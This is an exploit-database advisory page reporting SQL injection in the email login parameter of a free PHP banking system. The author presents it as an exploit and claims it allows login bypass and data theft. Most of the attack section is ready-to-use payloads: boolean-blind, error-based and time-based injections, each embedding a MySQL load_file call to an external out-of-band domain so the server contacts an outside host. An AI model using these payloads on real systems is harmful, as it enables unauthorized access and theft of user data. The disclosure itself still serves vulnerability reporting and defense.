---
title: banking-1.0-Copyright©2025-Multiple-SQLi
url: https://cxsecurity.com/issue/WLB-2025010011
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-01-10
fetch_date: 2025-10-06T20:05:56.026693
---

# banking-1.0-Copyright©2025-Multiple-SQLi

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **banking-1.0-Copyright©2025-Multiple-SQLi** **2025.01.09**  **![bg](https://cert.cx/cxstatic/images/flags/bg.png) [nu11secur1ty](https://cxsecurity.com/author/nu11secur1ty/1/) **(BG)** ![bg](https://cert.cx/cxstatic/images/flags/bg.png)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

# Titles: banking-1.0-Copyright©2025-Multiple-SQLi
# Author: nu11secur1ty
# Date: 01/08/2025
# Vendor: https://github.com/oretnom23
# Software: https://www.sourcecodester.com/php/14868/banking-system-using-php-free-source-code.html
# Reference: https://portswigger.net/web-security/sql-injection
## Description:
The email parameter appears to be vulnerable to SQL injection attacks. The payload '+(select load\_file('\\\\4w1s2cnl83k6s24y0drdhr7oofu8iy6p9d10rog.stupidom23.com\\ilo'))+' was submitted in the email parameter. This payload injects a SQL sub-query that calls MySQL's load\_file function with a UNC file path that references a URL on an external domain. The application interacted with that domain, indicating that the injected SQL query was executed. The attacker can get all sensitive information from this system when he attacks it online, He can login super easily WITHOUT PASSWORD - ONLY USER - bypassing, and can crash or get every sensitive information from him!
STATUS: HIGH-CRITICAL Vulnerability
[+]Exploit:
- SQLi-Bypass login authentication:
```SQLi
---
Parameter: email (POST)
Type: boolean-based blind
Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
Payload: email=UEGfdIzd@burpcollaborator.net'+(select load\_file('\\\\4w1s2cnl83k6s24y0drdhr7oofu8iy6p9d10rog.stupidom23.com\\ilo'))+'' OR NOT 6969=6969 OR 'HVGA'='sQHv&password=j0G!e2m!P1
Type: error-based
Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
Payload: email=UEGfdIzd@burpcollaborator.net'+(select load\_file('\\\\4w1s2cnl83k6s24y0drdhr7oofu8iy6p9d10rog.stupidom23.com\\ilo'))+'' AND (SELECT 4727 FROM(SELECT COUNT(\*),CONCAT(0x71626b7871,(SELECT (ELT(4727=4727,1))),0x716b766b71,FLOOR(RAND(0)\*2))x FROM INFORMATION\_SCHEMA.PLUGINS GROUP BY x)a) OR 'eBud'='Nhgo&password=j0G!e2m!P1
Type: time-based blind
Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
Payload: email=UEGfdIzd@burpcollaborator.net'+(select load\_file('\\\\4w1s2cnl83k6s24y0drdhr7oofu8iy6p9d10rog.stupidom23.com\\ilo'))+'' AND (SELECT 3370 FROM (SELECT(SLEEP(7)))mlWm) OR 'JXim'='FWfb&password=j0G!e2m!P1
---
```
# Reproduce:
[href](https://www.patreon.com/posts/banking-1-0-c-119553309)
## Time spent:
00:15:00
--
System Administrator - Infrastructure Engineer
Penetration Testing Engineer
Exploit developer at https://packetstormsecurity.com/ https://cve.mitre.org/index.html
https://cxsecurity.com/ and https://www.exploit-db.com/
0day Exploit DataBase https://0day.today/
home page: https://www.nu11secur1ty.com/
hiPEnIMR0v7QCo/+SEH9gBclAAYWGnPoBIQ75sCj60E=
nu11secur1ty <http://nu11secur1ty.com/>

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2025010011)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top